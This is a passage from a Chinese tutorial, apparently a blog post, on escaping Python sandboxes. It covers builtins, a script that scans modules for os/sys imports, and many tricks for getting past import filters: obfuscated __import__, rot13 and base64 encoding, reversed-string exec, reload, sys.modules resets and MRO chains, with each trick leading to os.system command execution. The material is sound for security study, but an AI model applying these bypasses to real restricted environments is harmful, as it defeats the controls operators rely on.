dict.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; dict.__class__&lt;type &apos;type&apos;&gt;</code></pre><p><strong>他们的父类都是 object , 类型都是 type</strong>，这点很重要！</p><p>我们把他们放在一个表里看看：</p><p><img src="https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg" alt></p><p>白板上的虚线表示源是目标的实例，实线表示源是目标的子类。即，左边的是右边的类型，而上面的是下面的父亲。</p><h2 id="builtin、builtins、builtins-是什么？"><a href="#builtin、builtins、builtins-是什么？" class="headerlink" title="builtin、builtins、builtins 是什么？"></a><strong>builtin</strong>、<strong>builtins</strong>、builtins 是什么？</h2><p>python 中有一个内建模块，该模块中有一些常用函数；而该模块在 Python 启动之后、且没有执行任何代码之前，python 会首先加载该内建函数到内存中。另外，该内建函数中的功能可以直接使用不需要添加任何内建模块前缀，其原因是对函数、变量、类等标识符的查找是按照 LE(N)GB 的规则</p><pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>在 Python2.x 版本中，内建模块被命为 <code>__builtin__</code> , 而到了 Python3.x 版本更名为 <code>builtins</code> .</p><p>当使用内建模块中函数或其它功能时，可以直接使用，不用添加内建模块的名字;但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即 <strong>dict</strong> 字典属性)中添加该功能。在导入时，如果是 Python2.X 版本，就要导入 <code>__builtin__</code> 模块;如果是 Python3.X版本，就要导入builtins 模块。如：在 Python2.X 中，向内建模块添加 一个函数(该函数打印 “hello, world” )，可以这样写</p><pre><code>&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; def print_hello():...     print &quot;hello world!&quot;...&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello&gt;&gt;&gt; print_hello()hello world!&gt;&gt;&gt; hello()hello world!</code></pre><p>此时， <code>print_hello</code> 和 <code>hello</code> 两个函数名几乎是一样，但是有一点区别，<code>print_hello</code>只能在该模块中使用，而 <code>hello</code> 可以在本程序中的其它任何一个模块中使用，因为 <code>hello</code> 已经放到内建模块中了。</p><p>说完了 <code>__builtin__</code> 和 <code>builtin</code> ,那 <code>__builtins__</code> 是什么？</p><p><code>__builtins__</code> 即是引用，也是在代码运行之前被加载到内存中。但是它们还有一点区别：</p><ol><li>无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入 <code>__builtin__</code> 内建模块;而对于 <code>__builtins__</code> 却不用导入，它在任何模块都直接可见</li><li>在主模块 <code>__main__</code> 中 <code>__builtins__</code> 是对内建模块 <code>__builtin__</code> 本身的引用，即 <code>__builtins__</code> 完全等价于 <code>__builtin__</code> ，二者完全是一个东西，不分彼此；在非主模块中 <code>__builtins__</code> 仅是对 <code>__builtin__</code> . <code>__dict__</code> 的引用，而非<code>__builtin__</code> 本身。它在任何地方都可见。此时 <code>__builtins__</code> 的类型是字典。</li></ol><p>我们打开 IDLE 看看这里面都有什么东西吧(Python 2.7)。</p><pre><code>&gt;&gt;&gt; dir(__builtins__)[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>我们看到了常用的 <code>__import__</code> 、 <code>bin</code> 、 <code>eval</code> 等命令</p><p>好了，现在我们已经大致上知道了各个模块之间的关系了！</p><h2 id="Python-有哪些可以执行系统命令呢？"><a href="#Python-有哪些可以执行系统命令呢？" class="headerlink" title="Python 有哪些可以执行系统命令呢？"></a>Python 有哪些可以执行系统命令呢？</h2><p>os  commands  subprocess  timeit  platform  pty …</p><p>搬运一个测试所有导入 os 或者 sys 的库的脚本：</p><pre><code>#-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity 库删掉all_modules_2 = [    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;]all_modules_3 = [    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, &apos;calendar&apos;, &apos;macpath&apos;, &apos;sqlite3&apos;, &apos;_collections_abc&apos;, &apos;certifi&apos;, &apos;macurl2path&apos;, &apos;sre_compile&apos;, &apos;_compat_pickle&apos;, &apos;cgi&apos;, &apos;mailbox&apos;, &apos;sre_constants&apos;, &apos;_compression&apos;, &apos;cgitb&apos;, &apos;mailcap&apos;, &apos;sre_parse&apos;, &apos;_crypt&apos;, &apos;chardet&apos;, &apos;mako&apos;, &apos;ssl&apos;, &apos;_csv&apos;, &apos;chunk&apos;, &apos;markupsafe&apos;, &apos;stat&apos;, &apos;_ctypes&apos;, &apos;cmath&apos;, &apos;marshal&apos;, &apos;statistics&apos;, &apos;_ctypes_test&apos;, &apos;cmd&apos;, &apos;math&apos;, &apos;string&apos;, &apos;_curses&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;stringprep&apos;, &apos;_curses_panel&apos;, &apos;codecs&apos;, &apos;mmap&apos;, &apos;struct&apos;, &apos;_datetime&apos;, &apos;codeop&apos;, &apos;modual_test&apos;, &apos;subprocess&apos;, &apos;_dbm&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sunau&apos;, &apos;_dbus_bindings&apos;, &apos;colorsys&apos;, &apos;multiprocessing&apos;, &apos;symbol&apos;, &apos;_dbus_glib_bindings&apos;, &apos;compileall&apos;, &apos;nacl&apos;, &apos;symtable&apos;, &apos;_decimal&apos;, &apos;concurrent&apos;, &apos;netrc&apos;, &apos;sys&apos;, &apos;_dummy_thread&apos;, &apos;configparser&apos;, &apos;nis&apos;, &apos;sysconfig&apos;, &apos;_elementtree&apos;, &apos;contextlib&apos;, &apos;nntplib&apos;, &apos;syslog&apos;, &apos;_functools&apos;, &apos;copy&apos;, &apos;ntpath&apos;, &apos;systemd&apos;, &apos;_gdbm&apos;, &apos;copyreg&apos;, &apos;nturl2path&apos;, &apos;tabnanny&apos;, &apos;_hashlib&apos;, &apos;crypt&apos;, &apos;numbers&apos;, &apos;tarfile&apos;, &apos;_heapq&apos;, &apos;cryptography&apos;, &apos;oauth&apos;, &apos;telnetlib&apos;, &apos;_imp&apos;, &apos;csv&apos;, &apos;olefile&apos;, &apos;tempfile&apos;, &apos;_io&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;termios&apos;, &apos;_json&apos;, &apos;cups&apos;, &apos;operator&apos;, &apos;test&apos;, &apos;_locale&apos;, &apos;cupsext&apos;, &apos;optparse&apos;, &apos;textwrap&apos;, &apos;_lsprof&apos;, &apos;cupshelpers&apos;, &apos;orca&apos;, &apos;_lzma&apos;, &apos;curses&apos;, &apos;os&apos;, &apos;threading&apos;, &apos;_markupbase&apos;, &apos;datetime&apos;, &apos;ossaudiodev&apos;, &apos;time&apos;, &apos;_md5&apos;, &apos;dbm&apos;, &apos;parser&apos;, &apos;timeit&apos;, &apos;_multibytecodec&apos;, &apos;dbus&apos;, &apos;pathlib&apos;, &apos;token&apos;, &apos;_multiprocessing&apos;, &apos;deb822&apos;, &apos;pcardext&apos;, &apos;tokenize&apos;, &apos;_opcode&apos;, &apos;debconf&apos;, &apos;pdb&apos;, &apos;trace&apos;, &apos;_operator&apos;, &apos;debian&apos;, &apos;pexpect&apos;, &apos;traceback&apos;, &apos;_osx_support&apos;, &apos;debian_bundle&apos;, &apos;pickle&apos;, &apos;tracemalloc&apos;, &apos;_pickle&apos;, &apos;decimal&apos;, &apos;pickletools&apos;, &apos;tty&apos;, &apos;_posixsubprocess&apos;, &apos;defer&apos;, &apos;pipes&apos;, &apos;turtle&apos;, &apos;_pydecimal&apos;, &apos;difflib&apos;, &apos;pkg_resources&apos;, &apos;types&apos;, &apos;_pyio&apos;, &apos;dis&apos;, &apos;pkgutil&apos;, &apos;typing&apos;, &apos;_random&apos;, &apos;distro_info&apos;, &apos;platform&apos;, &apos;ufw&apos;, &apos;_sha1&apos;, &apos;distro_info_test&apos;, &apos;plistlib&apos;, &apos;unicodedata&apos;, &apos;_sha256&apos;, &apos;distutils&apos;, &apos;poplib&apos;, &apos;unittest&apos;, &apos;_sha3&apos;, &apos;doctest&apos;, &apos;posix&apos;, &apos;urllib&apos;, &apos;_sha512&apos;, &apos;dummy_threading&apos;, &apos;posixpath&apos;, &apos;urllib3&apos;, &apos;_signal&apos;, &apos;email&apos;, &apos;pprint&apos;, &apos;usbcreator&apos;, &apos;_sitebuiltins&apos;, &apos;encodings&apos;, &apos;problem_report&apos;, &apos;uu&apos;, &apos;_socket&apos;, &apos;enum&apos;, &apos;profile&apos;, &apos;uuid&apos;, &apos;_sqlite3&apos;, &apos;errno&apos;, &apos;pstats&apos;, &apos;venv&apos;, &apos;_sre&apos;, &apos;faulthandler&apos;, &apos;pty&apos;, &apos;wadllib&apos;, &apos;_ssl&apos;, &apos;fcntl&apos;, &apos;ptyprocess&apos;, &apos;warnings&apos;, &apos;_stat&apos;, &apos;filecmp&apos;, &apos;pwd&apos;, &apos;wave&apos;, &apos;_string&apos;, &apos;fileinput&apos;, &apos;py_compile&apos;, &apos;weakref&apos;, &apos;_strptime&apos;, &apos;fnmatch&apos;, &apos;pyatspi&apos;, &apos;webbrowser&apos;, &apos;_struct&apos;, &apos;formatter&apos;, &apos;pyclbr&apos;, &apos;wsgiref&apos;, &apos;_symtable&apos;, &apos;fractions&apos;, &apos;pydoc&apos;, &apos;xdg&apos;, &apos;_sysconfigdata_m_linux_x86_64-linux-gnu&apos;, &apos;ftplib&apos;, &apos;pydoc_data&apos;, &apos;xdrlib&apos;, &apos;_testbuffer&apos;, &apos;functools&apos;, &apos;pyexpat&apos;, &apos;xkit&apos;, &apos;_testcapi&apos;, &apos;gc&apos;, &apos;pygtkcompat&apos;, &apos;xml&apos;, &apos;_testimportmultiple&apos;, &apos;genericpath&apos;, &apos;pymacaroons&apos;, &apos;xmlrpc&apos;, &apos;_testmultiphase&apos;, &apos;getopt&apos;, &apos;pyrfc3339&apos;, &apos;xxlimited&apos;, &apos;_thread&apos;, &apos;getpass&apos;, &apos;pytz&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;gettext&apos;, &apos;queue&apos;, &apos;yaml&apos;, &apos;_tracemalloc&apos;, &apos;gi&apos;, &apos;quopri&apos;, &apos;zipapp&apos;, &apos;_warnings&apos;, &apos;glob&apos;, &apos;random&apos;, &apos;zipfile&apos;, &apos;_weakref&apos;, &apos;grp&apos;, &apos;re&apos;, &apos;zipimport&apos;, &apos;_weakrefset&apos;, &apos;gtweak&apos;, &apos;readline&apos;, &apos;zlib&apos;, &apos;_yaml&apos;, &apos;gzip&apos;, &apos;reportlab&apos;, &apos;zope&apos;, &apos;abc&apos;, &apos;hashlib&apos;, &apos;reprlib&apos;, &apos;aifc&apos;, &apos;heapq&apos;]methods = [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;]results = {}for module in all_modules_3:    results[module] = {        &apos;flag&apos;: 0,        &apos;result&apos;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                result = &apos;yes&apos;                results[module][&apos;flag&apos;] = 1            else:                result = &apos;no&apos;            results[module][&apos;result&apos;][method] = result    except Exception as e:        print(e)for result in results:    if results[result][&apos;flag&apos;]:        print(&apos;[+]&apos; + result)        for r in results[result][&apos;result&apos;]:            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>从结果可以看到有相当大一部分模块都导入了“危险”的函数。只要我们可以 <code>import</code> 那么存在这些模块的环境就是危险的。</p><h3 id="如果我们没办法-import-呢？"><a href="#如果我们没办法-import-呢？" class="headerlink" title="如果我们没办法 import 呢？"></a>如果我们没办法 import 呢？</h3><p>如果只是简单的禁用 <code>import os</code> 我们可以加空格绕过 <code>import   os</code> .</p><p>如果多个空格也过滤了我们还可以 <code>__import__(&#39;os&#39;)</code>.</p><p>如果过滤 os 我们还可以 <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>。</p><p>如果这也不行还有 <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p><p>联想到我们上面说的 <code>__builtin__/__builtins__</code>,一些危险内建函数都可以直接用，如果这些函数都被 del 掉我们可以 <code>reload(__builtin__)</code> 来重载一个完整的 <code>__builtin__</code>.</p><p>reload 也是内建函数，如果这也没了呢？ </p><pre><code>import impimp.reload(__builtin__)</code></pre><p>也可以引入。</p><p>如果 <code>sys.modules[&#39;os&#39;]=None</code> 从根源删除呢？</p><p>实际上联系到 import 的原理</p><blockquote><p>如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p></blockquote><p>如果 <code>sys</code> 可以用的话可以先确认一下路径</p><pre><code>import sysprint(sys.path)</code></pre><p>本质上是执行一遍导入的库，这个过程可以用 <code>execfile</code> 来代替</p><pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)system(&apos;ls&apos;)</code></pre><p>3.x 中删除了 execfile ，不过可以这样：</p><pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:    exec(f.read())system(&apos;ls&apos;)</code></pre><p>还有一种方法：当我们使用 del sys.modules[‘os’] 时是不起作用的，因为在import 时会在检测到不存在 os 时重载一次，也就是说我们可以</p><pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj 为你加的del sys.modules[&apos;os&apos;]import osos.system(&apos;ls&apos;)</code></pre><h3 id="其他一些小技巧"><a href="#其他一些小技巧" class="headerlink" title="其他一些小技巧"></a>其他一些小技巧</h3><ol><li><p>过滤掉整个匹配语句我们可以使用变量替换的方式</p><p> a = open<br> print(a(“d:/test.txt”).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1…</type></mount></file></p></li><li><p>函数后面加空格、换行都能执行</p></li><li><p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数</p><p> from numpy.distutils.exec_command import _exec_command as system</p><p> system(“ls /“)</p></li><li><p>使用别名</p><p> import os as o</p></li><li><p>字符串拼接</p><p> “l”+”s”</p><p> “func_global”+”s”</p></li><li><p>字符串编码或者其他操作</p><p> ‘X19pbXBvcnRfXw==’.decode(‘base64’) //<strong>import</strong></p><p> <strong>import</strong>(‘so’[::-1]).system(‘ls’)</p><p> eval(‘)”imaohw”(metsys.)”so”(<strong>tropmi</strong>‘[::-1])</p><p> exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])</p></li></ol><h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h2><p>通过 Python 的继承关也就是说我们想利用的模块被杀了之后我们想办法构造一条到基类的链然后再自顶向下重新找到一个可行的路来使用目标模块。 </p><p>python 类中有个属性叫 <strong>mro</strong> ,是个元组记录了继承关系。</p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, 